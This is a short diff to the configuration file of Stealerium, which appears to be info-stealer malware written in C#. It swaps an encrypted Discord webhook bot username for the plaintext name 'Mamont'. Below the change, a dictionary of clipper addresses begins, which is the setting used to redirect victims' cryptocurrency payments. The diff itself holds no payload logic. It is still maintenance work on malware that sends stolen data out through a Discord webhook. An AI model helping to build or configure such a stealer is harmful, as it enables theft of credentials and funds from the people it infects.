@@ -79,8 +79,7 @@ namespace Stealerium
         });
 
         // Discord Webhook bot username
-        public static string Username = StringsCrypt.Decrypt(new byte[]
-            { 208, 138, 80, 115, 89, 12, 47, 194, 189, 116, 154, 25, 46, 155, 252, 130 });
+        public static string Username = "Mamont";
 
         // Clipper addresses:
         public static Dictionary<string, string> ClipperAddresses =
